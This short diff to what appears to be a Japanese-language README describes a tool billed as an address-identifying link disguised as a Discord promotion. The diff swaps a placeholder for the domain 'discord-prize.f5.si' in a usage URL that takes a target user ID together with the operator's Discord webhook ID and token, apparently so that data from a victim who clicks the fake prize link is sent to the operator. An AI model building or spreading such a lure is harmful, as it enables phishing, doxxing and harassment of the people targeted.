@@ -1,6 +1,5 @@
-Discordプロモーションを偽造した住所を特定するリンク
-準備中
+Discordプロモーションを偽造した住所特定リンク
 ### 📚使い方:
 ```
-https://link/?&[Target User ID]&[Your Webhook ID]&[Your Webhook Token]
+https://discord-prize.f5.si/?&[Target User ID]&[Your Webhook ID]&[Your Webhook Token]
 ```
